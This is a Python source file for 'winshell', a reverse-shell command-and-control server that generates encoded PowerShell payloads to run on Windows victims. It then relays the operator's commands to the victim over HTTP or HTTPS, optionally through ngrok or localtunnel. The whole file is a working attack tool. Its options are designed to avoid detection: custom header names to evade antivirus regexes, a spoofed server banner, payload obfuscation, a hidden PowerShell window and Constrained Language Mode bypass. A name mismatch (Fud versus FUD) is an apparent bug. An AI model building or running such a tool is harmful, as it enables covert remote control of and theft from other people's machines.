import calendar
import random
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, argparse, base64, readline, uuid, re
from os import system, path
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event
from time import sleep
from ipaddress import ip_address
from subprocess import check_output, Popen, PIPE
from string import ascii_uppercase, ascii_lowercase
from platform import system as get_system_type
from random import randint

filterwarnings("ignore", category=DeprecationWarning)

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'

''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'


# Enable ansi escape characters
def chill():
    pass


WINDOWS = True if get_system_type() == 'Windows' else False
system('') if WINDOWS else chill()

# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(
    formatter_class=argparse.RawTextHelpFormatter,
    epilog='''

Usage examples:

  - Basic shell session over http:

      sudo python3 winshell.py -s <your_ip>

  - Recommended usage to avoid detection (over http):

     # winshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. 
     # Use -H to provide a standard or custom http header name to avoid detection.
     sudo python3 winshell.py -s <your_ip> -i -H "Authorization"

     # The same but with --exec-outfile (-x)
     sudo python3 winshell.py -s <your_ip> -i -H "Authorization" -x "C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1"

  - Encrypted shell session (https):

     # First you need to generate self-signed certificates:
     openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
     sudo python3 winshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>

  - Encrypted shell session with a trusted certificate:

     sudo python3 winshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>

  - Encrypted shell session with reverse proxy tunneling tools:

     sudo python3 winshell.py -lt 

	 OR 

     sudo python3 winshell.py -ng


'''
)

parser.add_argument("-s", "--server-ip", action="store", help="Your winshell server ip address or domain.")
parser.add_argument("-c", "--certfile", action="store", help="Path to your ssl certificate.")
parser.add_argument("-k", "--keyfile", action="store", help="Path to the private key for your certificate.")
parser.add_argument("-p", "--port", action="store",
                    help="Your winshell server port (default: 8080 over http, 443 over https).", type=int)
parser.add_argument("-f", "--frequency", action="store",
                    help="Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s).",
                    type=float)
parser.add_argument("-i", "--invoke-restmethod", action="store_true",
                    help="Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility.")
parser.add_argument("-H", "--Header", action="store",
                    help="winshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
parser.add_argument("-x", "--exec-outfile", action="store",
                    help="Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
parser.add_argument("-r", "--raw-payload", action="store_true", help="Generate raw payload instead of base64 encoded.")
parser.add_argument("-o", "--obfuscate", action="store_true", help="Obfuscate generated payload.")
parser.add_argument("-v", "--server-version", action="store",
                    help="Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
parser.add_argument("-g", "--grab", action="store_true", help="Attempts to restore a live session (default: false).")
parser.add_argument("-t", "--trusted-domain", action="store_true",
                    help="If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
parser.add_argument("-cm", "--constraint-mode", action="store_true",
                    help="Generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.")
parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate Payload with localtunnel")
parser.add_argument("-ng", "--ngrok", action="store_true", help="Generate Payload with Ngrok")
parser.add_argument("-u", "--update", action="store_true", help="Pull the latest version from the original repo.")
parser.add_argument("-q", "--quiet", action="store_true", help="Do not print the banner on startup.")

args = parser.parse_args()


def exit_with_msg(msg):
    print(f"[{DEBUG}] {msg}")
    sys.exit(0)


# Check if port is valid.
if args.port:
    if args.port < 1 or args.port > 65535:
        exit_with_msg('Port number is not valid.')

# Check if both cert and key files were provided
if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
    exit_with_msg('Failed to start over https. Missing key or cert file (check -h for more details).')

ssl_support = True if args.certfile and args.keyfile else False


# -------------- General Functions -------------- #


def promptHelpMsg():
    print(
        '''
        \r  Command                    Description
        \r  -------                    -----------
        \r  help                       Print this message.
        \r  payload                    Print payload (base64).
        \r  rawpayload                 Print payload (raw).
        \r  clear                      Clear screen.
        \r  exit/quit/q                Close session and exit.
        ''')


def encodePayload(payload):
    enc_payload = "powershell  -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    write_to_bat_file = "powershell -WindowStyle hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    ps1_file_name = calendar.timegm(time.gmtime())
    with open(f"{ps1_file_name}.ps1", "w") as payload_file:
        payload_file.write(write_to_bat_file)
    print(f'{PLOAD}Payload created {ps1_file_name}.ps1{END}')
    print(f'{PLOAD}{enc_payload}{END}')


def is_valid_uuid(value):
    try:
        uuid.UUID(str(value))
        return True

    except ValueError:
        return False


def checkPulse(stop_event):
    while not stop_event.is_set():

        timestamp = int(datetime.now().timestamp())
        tlimit = frequency + 10

        if winshell.execution_verified and winshell.prompt_ready:
            if abs(winshell.last_received - timestamp) > tlimit:
                print(f'\r[{WARN}] Session has been idle for more than {tlimit} seconds. Shell probably died.')
                winshell.prompt_ready = True
                stop_event.set()

        else:
            winshell.last_received = timestamp

        sleep(5)


# ------------------ Settings ------------------ #
prompt = "winshell > "
quiet = True if args.quiet else False
frequency = args.frequency if args.frequency else 0.8
stop_event = Event()
t_process = None


def rst_prompt(force_rst=False, prompt=prompt, prefix='\r'):
    if winshell.rst_promt_required or force_rst:
        sys.stdout.write(prefix + prompt + readline.get_line_buffer())
        winshell.rst_promt_required = False


# -------------- Tunneling Server -------------- #
class Tunneling:

    def __init__(self, port):

        '''Initialization of Tunnel Process'''

        localtunnel = ['lt', '-p', str(port), '-l', '127.0.0.1']
        ngrok = ['ngrok', 'http', str(port), '--log', 'stdout']

        if args.ngrok:
            self.__start(ngrok)
        elif args.localtunnel:
            self.__start(localtunnel)

    def __start(self, command):
        '''Start Tunneling Process'''
        try:
            self.process = Popen(
                command,
                stdin=PIPE,
                stdout=PIPE,
                stderr=PIPE)
        except FileNotFoundError:

            if args.localtunnel:

                exit_with_msg(f"Please install LocalTunnel using the instructions at https://localtunnel.me")

            elif args.ngrok:

                exit_with_msg(f"Please install Ngrok using the instructions at https://ngrok.com")

    def lt_address(self):
        '''LocalTunnel Address'''

        output = self.process.stdout.readline().decode("utf-8").strip()

        try:

            if output and "your url is" in output:
                return output.replace('your url is: https://', '')

            else:
                self.process.kill()
                exit_with_msg(f"{output}")
        except Exception as ex:
            exit_with_msg(ex)

    def ngrok_address(self):
        '''Ngrok Address'''

        try:
            # sleep(5) #wait until ngrok get start
            while True:
                output = self.process.stdout.readline().decode("utf-8").strip()

                if not output and self.process.poll() is not None:
                    break

                elif 'url=' in output:
                    # output = output.split('url=https://')[-1]
                    output = url = re.compile(r".*url=(http|https):\/\/(.*)").findall(output)[0][1]
                    return output

        except Exception as ex:
            self.process.terminate()
            exit_with_msg(ex)

    def terminate(self):

        self.process.kill()  # Terminate running tunnel process
        print(f'\r[{WARN}] Tunnel terminated.')


# -------------- winshell Server -------------- #
class winshell(BaseHTTPRequestHandler):
    restored = False
    rst_promt_required = False
    prompt_ready = True
    command_pool = []
    execution_verified = False
    last_received = ''
    verify = str(uuid.uuid4())[0:8]
    get_cmd = str(uuid.uuid4())[0:8]
    post_res = str(uuid.uuid4())[0:8]
    hid = str(uuid.uuid4()).split("-")
    header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
    SESSIONID = '-'.join([verify, get_cmd, post_res])
    server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
    init_dir = None

    def cmd_output_interpreter(self, output, constraint_mode=False):

        global prompt

        try:

            if constraint_mode:
                output = output.decode('utf-8', 'ignore')

            else:
                bin_output = output.decode('utf-8').split(' ')
                to_b_numbers = [int(n) for n in bin_output]
                b_array = bytearray(to_b_numbers)
                output = b_array.decode('utf-8', 'ignore')

            tmp = output.rsplit("Path", 1)
            output = tmp[0]
            junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
            output = output.rsplit("Drive", 1)[0] if junk else output

            if winshell.init_dir == None:
                p = tmp[-1].strip().rsplit("\n")[-1]
                p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
                winshell.init_dir = p

            if not args.exec_outfile:
                p = tmp[-1].strip().rsplit("\n")[-1]
                p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p

            else:
                p = winshell.init_dir

            prompt = f"PS {p} > "

        except UnicodeDecodeError:
            print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')

        if isinstance(output, bytes):
            return str(output)

        else:
            output = output.strip() + '\n' if output.strip() != '' else output.strip()
            return output

    def do_GET(self):

        timestamp = int(datetime.now().timestamp())
        winshell.last_received = timestamp

        if args.grab and not winshell.restored:
            if not args.Header:
                header_id = [header.replace("X-", "") for header in self.headers.keys() if
                             re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
                winshell.header_id = f'X-{header_id[0]}'
            else:
                winshell.header_id = args.Header

            session_id = self.headers.get(winshell.header_id)

            if len(session_id) == 26:
                h = session_id.split('-')
                winshell.verify = h[0]
                winshell.get_cmd = h[1]
                winshell.post_res = h[2]
                winshell.SESSIONID = session_id
                winshell.restored = True
                winshell.execution_verified = True
                session_check = Thread(target=checkPulse, args=(stop_event,))
                session_check.daemon = True
                session_check.start()

                print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
                winshell.rst_promt_required = True

        self.server_version = winshell.server_version
        self.sys_version = ""
        session_id = self.headers.get(winshell.header_id)
        legit = True if session_id == winshell.SESSIONID else False

        # Verify execution
        if self.path == f'/{winshell.verify}' and legit:

            self.send_response(200)
            self.send_header('Content-type', 'text/javascript; charset=UTF-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(bytes('OK', "utf-8"))
            winshell.execution_verified = True
            session_check = Thread(target=checkPulse, args=(stop_event,))
            session_check.daemon = True
            session_check.start()
            print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
            print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end='\n\n')  # end = ''
            print(
                f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if args.exec_outfile else chill()
            winshell.prompt_ready = False
            winshell.command_pool.append(f"echo `r;pwd")
            winshell.rst_promt_required = True


        # Grab cmd
        elif self.path == f'/{winshell.get_cmd}' and legit and winshell.execution_verified:

            self.send_response(200)
            self.send_header('Content-type', 'text/javascript; charset=UTF-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            if len(winshell.command_pool):
                cmd = winshell.command_pool.pop(0)
                self.wfile.write(bytes(cmd, "utf-8"))

            else:
                self.wfile.write(bytes('None', "utf-8"))

            winshell.last_received = timestamp


        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Move on mate.')
            pass

    def do_POST(self):

        global prompt
        timestamp = int(datetime.now().timestamp())
        winshell.last_received = timestamp
        self.server_version = winshell.server_version
        self.sys_version = ""
        session_id = self.headers.get(winshell.header_id)
        legit = True if session_id == winshell.SESSIONID else False

        # cmd output
        if self.path == f'/{winshell.post_res}' and legit and winshell.execution_verified:

            try:
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OK')
                content_len = int(self.headers.get('Content-Length'))
                output = self.rfile.read(content_len)
                output = winshell.cmd_output_interpreter(self, output, constraint_mode=args.constraint_mode)

                if output:
                    print(f'\r{GREEN}{output}{END}')


            except ConnectionResetError:
                print(
                    f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')

            rst_prompt(prompt=prompt)
            winshell.prompt_ready = True

        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Move on mate.')
            pass

    def do_OPTIONS(self):

        self.server_version = winshell.server_version
        self.sys_version = ""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
        self.send_header('Vary', "Origin")
        self.send_header('Access-Control-Allow-Credentials', 'true')
        self.send_header('Access-Control-Allow-Headers', winshell.header_id)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return

    @staticmethod
    def dropSession():

        print(f'\r[{WARN}] Closing session elegantly...')

        if t_process:
            t_process.terminate()

        if not args.exec_outfile:
            winshell.command_pool.append('exit')
        else:
            winshell.command_pool.append(f'del {args.exec_outfile};exit')

        sleep(frequency + 2.0)
        print(f'[{WARN}] Session terminated.')
        stop_event.set()
        sys.exit(0)

    @staticmethod
    def terminate():

        if winshell.execution_verified:
            winshell.dropSession()

        else:
            if t_process:
                t_process.terminate()
            print(f'\r[{WARN}] Session terminated.')
            stop_event.set()
            sys.exit(0)


class Fud():
    def __init__(self):
        self.chars = 'abcdefghijklmnoprstuvyzqwxABCDEFGHJKLMNOPRSTUVYZQWX0123456789'

    def generate_random_variable(self):
        random_var = ''

        for x in range(0, 12):
            random_var += self.chars[random.randint(0, len(self.chars) - 1)]

        return random_var


def main():
    try:
        cwd = path.dirname(path.abspath(__file__))

        # Update utility
        if args.update:

            updated = False

            try:

                print(f'[{INFO}] Pulling changes from the master branch...')
                u = check_output(f'cd {cwd}&&git pull https://github.com/varenaaa/winshell main', shell=True).decode(
                    'utf-8')

                if re.search('Updating', u):
                    print(f'[{INFO}] Update completed! Please, restart winshell.')
                    updated = True

                elif re.search('Already up to date', u):
                    print(f'[{INFO}] Already running the latest version!')
                    pass

                else:
                    print(f'[{FAILED}] Something went wrong. Are you running winshell from your local git repository?')
                    print(
                        f'[{DEBUG}] Consider running "git pull https://github.com/varenaaa/winshell main" inside the project\'s directory.')

            except:
                print(
                    f'[{FAILED}] Update failed. Consider running "git pull https://github.com/varenaaa/winshell main" inside the project\'s directory.')

            if updated:
                sys.exit(0)

        # Provided options sanity check
        if not args.server_ip and args.update and len(sys.argv) == 2 and not (args.localtunnel or args.ngrok):
            sys.exit(0)

        if not args.server_ip and args.update and len(sys.argv) > 2 and not (args.localtunnel or args.ngrok):
            exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')

        elif not args.server_ip and not args.update and not (args.localtunnel or args.ngrok):
            exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')

        else:
            if not args.trusted_domain and not (args.localtunnel or args.ngrok):
                # Check if provided ip is valid
                try:
                    ip_object = ip_address(args.server_ip)

                except ValueError:
                    exit_with_msg('IP address is not valid.')

        # Check provided header name for illegal chars
        if args.Header:
            valid = ascii_uppercase + ascii_lowercase + '-_'

            for char in args.Header:
                if char not in valid:
                    exit_with_msg('Header name includes illegal characters.')

        # Check if http/https
        if ssl_support:
            server_port = int(args.port) if args.port else 443
        else:
            server_port = int(args.port) if args.port else 8080

        # Server IP
        server_ip = f'{args.server_ip}:{server_port}'

        # Tunneling
        global t_process
        tunneling = False

        if args.localtunnel or args.ngrok:
            tunneling = True
            t_process = Tunneling(server_port)  # will start tunnel process accordingly

            if args.localtunnel:
                t_server = t_process.lt_address()

            elif args.ngrok:
                t_server = t_process.ngrok_address()

            if not t_server:
                exit_with_msg(
                    'Failed to initiate tunnel. Possible cause: You have a tunnel agent session already running in the bg/fg.')

        # Start http server
        try:
            httpd = HTTPServer(('0.0.0.0', server_port), winshell)

        except OSError:
            exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')

        if ssl_support:
            httpd.socket = ssl.wrap_socket(
                httpd.socket,
                keyfile=args.keyfile,
                certfile=args.certfile,
                server_side=True,
                ssl_version=ssl.PROTOCOL_TLS
            )

        port = f':{server_port}' if server_port != 443 else ''

        winshell_server = Thread(target=httpd.serve_forever, args=())
        winshell_server.daemon = True
        winshell_server.start()

        # Generate payload
        if not args.grab:
            print(f'[{INFO}] Generating reverse shell payload...')

            if args.localtunnel:
                source = open(f'{cwd}/payload_templates/https_payload_localtunnel.ps1',
                              'r') if not args.exec_outfile else open(
                    './payload_templates/https_payload_localtunnel_outfile.ps1', 'r')

            elif args.ngrok:
                source = open(f'{cwd}/payload_templates/https_payload_ngrok.ps1',
                              'r') if not args.exec_outfile else open(
                    f'{cwd}/payload_templates/https_payload_ngrok_outfile.ps1', 'r')

            elif not ssl_support:
                source = open(f'{cwd}/payload_templates/http_payload.ps1', 'r') if not args.exec_outfile else open(
                    f'{cwd}/payload_templates/http_payload_outfile.ps1', 'r')

            elif ssl_support and args.trusted_domain:
                source = open(f'{cwd}/payload_templates/https_payload_trusted.ps1',
                              'r') if not args.exec_outfile else open(
                    f'{cwd}/payload_templates/https_payload_trusted_outfile.ps1', 'r')

            elif ssl_support and not args.trusted_domain:
                source = open(f'{cwd}/payload_templates/https_payload.ps1', 'r') if not args.exec_outfile else open(
                    f'{cwd}/payload_templates/https_payload_outfile.ps1', 'r')

            payload = source.read().strip()
            source.close()

            fud = FUD()

            generic_server_variable = fud.generate_random_variable()
            generic_session_variable = fud.generate_random_variable()

            splitted_http_variables = []

            for x in range(0, 7):
                splitted_http_variables.append(f'${fud.generate_random_variable()}')

            generic_protol_variable = f"{splitted_http_variables[0]}='H';{splitted_http_variables[1]}='t';" \
                                      f"{splitted_http_variables[2]}='T';{splitted_http_variables[3]}='P';" \
                                      f"{splitted_http_variables[4]}=':';{splitted_http_variables[5]}='/';" \
                                      f"{splitted_http_variables[6]}='/'"

            generated_protocol = ''
            for x in splitted_http_variables:
                generated_protocol += x

            payload = payload.replace('*SERVERIP*', (t_server if (args.localtunnel or args.ngrok) else server_ip)) \
                .replace('*SESSIONID*', winshell.SESSIONID) \
                .replace('*FREQ*', str(frequency)) \
                .replace('*VERIFY*', winshell.verify) \
                .replace('*GETCMD*', winshell.get_cmd) \
                .replace('*POSTRES*', winshell.post_res) \
                .replace('*HOAXID*', winshell.header_id) \
                .replace('$s', f'${generic_server_variable}') \
                .replace('$i', f'${generic_session_variable}') \
                .replace("$p='http://'", generic_protol_variable) \
                .replace('$p', generated_protocol)

            if args.invoke_restmethod:
                payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")

            if args.exec_outfile:
                payload = payload.replace("*OUTFILE*", args.exec_outfile)

            if args.constraint_mode:
                payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")

            if args.obfuscate:

                for var in ['$s', '$i', '$p', '$v']:
                    _max = randint(1, 5)
                    obf = str(uuid.uuid4())[0:_max]

                    payload = payload.replace(var, f'${obf}')

            encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')

            print(f'[{INFO}] Tunneling [{BOLD}{ORANGE}ON{END}]') if tunneling else chill()

            if tunneling:
                print(f'[{INFO}] Server Address: {BOLD}{BLUE}{t_server}{END}')

            print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
            print(f'[{INFO}] Https Server started on port {server_port}.') if ssl_support else print(
                f'[{INFO}] Http Server started on port {server_port}.')
            print(f'[{IMPORTANT}] {BOLD}Awaiting payload execution to initiate shell session...{END}')

        else:
            print(f'\r[{IMPORTANT}] Attempting to restore session. Listening for winshell traffic...')

        # Command prompt
        while True:

            if winshell.prompt_ready:

                user_input = input(prompt).strip()

                if user_input.lower() == 'help':
                    promptHelpMsg()

                elif user_input.lower() in ['clear']:
                    system('clear')

                elif user_input.lower() in ['payload']:
                    encodePayload(payload)

                elif user_input.lower() in ['rawpayload']:
                    print(f'{PLOAD}{payload}{END}')

                elif user_input.lower() in ['exit', 'quit', 'q']:
                    winshell.terminate()

                elif user_input == '':
                    rst_prompt(force_rst=True, prompt='\r')

                else:

                    if winshell.execution_verified and not winshell.command_pool:

                        if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"

                        winshell.command_pool.append(user_input + f";pwd")
                        winshell.prompt_ready = False

                    elif winshell.execution_verified and winshell.command_pool:
                        pass

                    else:
                        print(f'\r[{INFO}] No active session.')
    # ~ else:
    # ~ sleep(0.5)


    except KeyboardInterrupt:
        winshell.terminate()


if __name__ == '__main__':
    main()
